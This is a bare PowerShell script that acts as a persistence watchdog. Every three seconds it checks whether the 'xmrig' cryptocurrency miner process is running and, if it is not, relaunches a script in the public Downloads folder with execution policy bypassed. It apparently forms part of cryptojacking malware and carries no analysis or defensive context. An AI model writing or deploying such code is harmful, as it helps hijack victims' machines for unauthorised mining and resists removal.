$processName = "xmrig"
$scriptPath = "C:\Users\Public\Downloads\ring.ps1"

while ($true) {

    if (-not (Get-Process -Name $processName -ErrorAction SilentlyContinue)) {
        Start-Process powershell.exe `
            -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`""
    }

    Start-Sleep -Seconds 3
}
